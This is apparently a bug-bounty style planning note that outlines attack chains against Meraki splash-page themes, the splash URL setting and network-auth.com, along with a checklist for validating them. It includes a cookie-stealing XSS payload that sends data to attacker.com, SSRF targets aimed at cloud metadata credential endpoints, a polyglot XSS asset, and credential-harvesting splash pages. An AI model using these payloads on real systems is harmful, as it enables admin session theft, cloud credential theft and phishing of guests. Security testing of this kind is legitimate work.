# Meraki Splash Page / network-auth.com Attack Chains

## Architecture Summary

### Splash Page Types
| Type | Configuration | Content Source |
|------|---------------|----------------|
| Click-through (Meraki hosted) | `splashPage: "Click-through splash page"` | Meraki default templates |
| Custom Splash URL | `useSplashUrl: true`, `splashUrl: "https://..."` | External attacker-controlled URL |
| Hosted Custom Theme | `themeId: "<id>"`, `themeAssets: [...]` | User-uploaded HTML/CSS/JS via API |

### Key API Endpoints
```
GET    /networks/{networkId}/wireless/ssids/{number}/splash/settings
PUT    /networks/{networkId}/wireless/ssids/{number}/splash/settings
GET    /organizations/{orgId}/splash/themes
POST   /organizations/{orgId}/splash/themes          (create theme, optionally from baseTheme)
POST   /organizations/{orgId}/splash/themes/{themeId}/assets  (upload HTML/JS/CSS/images)
GET    /organizations/{orgId}/splash/assets/{id}     (returns base64 fileData)
```

### Asset Structure
- Themes contain `themeAssets[]` — e.g., `continue.html` (main splash page), CSS, JS, images
- Assets stored base64-encoded in Meraki backend
- Served from Meraki infrastructure (likely `*.network-auth.com` or proxied through it)

## Exploitable Chains

### CHAIN 1: Stored XSS via Hosted Splash Theme -> Dashboard Admin Takeover (P1)
**Assumption:** User-uploaded splash theme assets (HTML/JS) are safely sandboxed/escaped when rendered in Dashboard preview/admin UI.
**Violation:**
1. Attacker gains `wireless:config:write` API access (compromised key, OAuth, rogue admin)
2. `POST /organizations/{orgId}/splash/themes` -> create custom theme
3. `POST /organizations/{orgId}/splash/themes/{themeId}/assets` -> upload `continue.html` with `<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>`
4. Admin views theme list or clicks "Preview" in Dashboard -> malicious JS executes in **authenticated Dashboard origin** (`dashboard.meraki.com` or `nXXX.meraki.com`)
**Trust Boundary Crossed:** Guest/Untrusted Content -> Authenticated Admin Session
**Impact:** Full org compromise — steal admin session cookies/API keys, arbitrary actions as org admin, pivot to other orgs if super-admin, persistent
**Prerequisites:** API key with `wireless:config:write` OR compromised admin account
**Detection Gap:** No CSP on Dashboard preview iframe; no sanitization of uploaded HTML; theme assets not scanned

### CHAIN 2: Custom Splash URL -> SSRF Against Meraki Cloud / Device Metadata (P1-P2)
**Assumption:** `splashUrl` is a simple HTTP redirect target. Meraki device only sends user's browser there; no server-side fetch occurs.
**Violation:**
1. Attacker sets `useSplashUrl: true`, `splashUrl: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"` (AWS IMDSv1)
2. Or `splashUrl: "http://metadata.google.internal/computeMetadata/v1/"` (GCP)
3. Or `splashUrl: "http://localhost:8080/internal-admin"`
4. When guest connects, **Meraki AP/Controller fetches the splash URL server-side** to validate/render/preview it before serving to client
5. Response exfiltrated via splash page content or error logs
**Trust Boundary Crossed:** Guest WiFi Network -> Meraki Cloud/Device Internal Network
**Impact:** Cloud credential theft, internal recon, access internal APIs (ikarem.io, device management), bypass network segmentation
**Prerequisites:** Ability to configure SSID splash settings
**Validation Needed:** Confirm whether Meraki *device* or *cloud* fetches `splashUrl` server-side

### CHAIN 3: Splash Theme Asset Polyglot / MIME Confusion -> Stored XSS in Dashboard (P2)
**Assumption:** Theme assets served with correct `Content-Type` based on extension. `continue.html` -> `text/html`, `style.css` -> `text/css`. No execution of non-HTML assets.
**Violation:**
1. Upload asset named `style.css` with content: `/*<script>alert(1)</script>*/ body { background: url('javascript:alert(1)'); }`
2. Or upload `script.js` containing HTML + JS polyglot
3. Dashboard references asset via `<link rel="stylesheet" href="/splash/assets/{id}">` or `<script src="...">`
4. Browser MIME-sniffs and executes HTML/JS in Dashboard origin
**Trust Boundary Crossed:** Static Asset Storage -> Dynamic Script Execution in Dashboard Origin
**Impact:** Stored XSS via Asset Reference — executes when any admin views splash theme editor/preview, bypasses HTML sanitization, persistent across theme edits
**Prerequisites:** API `wireless:config:write`; Dashboard references assets unsafely

### CHAIN 4: network-auth.com Subdomain Takeover -> Splash Page Supply Chain (P2)
**Assumption:** `*.network-auth.com` is fully controlled by Meraki. Customer splash pages hosted on subdomains.
**Violation:**
1. Identify dangling `CNAME` records pointing to `network-auth.com` for deprovisioned customers
2. Or: Register expired subdomain if Meraki uses wildcard + customer-controlled DNS
3. Or: Exploit `splashUrl` validation — if Meraki only validates domain suffix, attacker hosts on `evil.network-auth.com` (if wildcard cert)
4. Serve malicious splash page to *all* guests of target org
**Trust Boundary Crossed:** Attacker Infrastructure -> Meraki Trusted Splash Domain
**Impact:** Mass guest compromise / credential harvesting, drive-by exploits, bypass Meraki content filtering
**Prerequisites:** Subdomain misconfiguration OR wildcard cert trust

### CHAIN 5: Self-Registration + Splash Theme -> Privilege Escalation to Meraki Auth (P2)
**Assumption:** `selfRegistration.enabled: true` with `authorizationType: "auto"` creates low-privilege local accounts. Splash page is separate from auth system.
**Violation:**
1. Enable `selfRegistration` + custom theme with `continue.html` containing credential harvesting form mimicking Meraki Auth login
2. Chain with `sentryEnrollment` — force MDM enrollment via malicious splash page
**Trust Boundary Crossed:** Guest Splash Context -> Meraki Auth / Systems Manager (ikarem.io) Enrollment
**Impact:** Credential Harvesting / MDM Enrollment Abuse
**Prerequisites:** Splash config access + `selfRegistration` enabled

## Validation Checklist
| Check | Method | Priority |
|-------|--------|----------|
| Dashboard preview renders `continue.html` in same origin? | Login to Dashboard, create theme, click Preview, inspect iframe origin | Critical |
| Meraki device/cloud fetches `splashUrl` server-side? | Set `splashUrl` to controlled server, monitor access logs | Critical |
| `Content-Type` headers on `/splash/assets/{id}`? | `GET` asset, check headers, test MIME confusion | High |
| CSP on Dashboard preview? | Check `Content-Security-Policy` header on preview response | High |
| `network-auth.com` subdomain allocation? | Create two orgs, check splash URLs, test subdomain collision | Medium |
| Sanitization of uploaded HTML? | Upload `<script>alert(1)</script>`, retrieve via GET, check encoding | Critical |
| `sentryEnrollment` + custom theme interaction? | Enable both, test MDM enrollment flow from splash | Medium |

## References
- API Spec: `GET/PUT /networks/{networkId}/wireless/ssids/{number}/splash/settings`
- API Spec: `GET/POST /organizations/{orgId}/splash/themes`
- API Spec: `POST /organizations/{orgId}/splash/themes/{themeIdentifier}/assets`
- API Spec: `GET /organizations/{orgId}/splash/assets/{id}`
- Scope: `*.network-auth.com` (user-created splash pages)
- Scope: `*.ikarem.io` (Systems Manager — sentryEnrollment integration)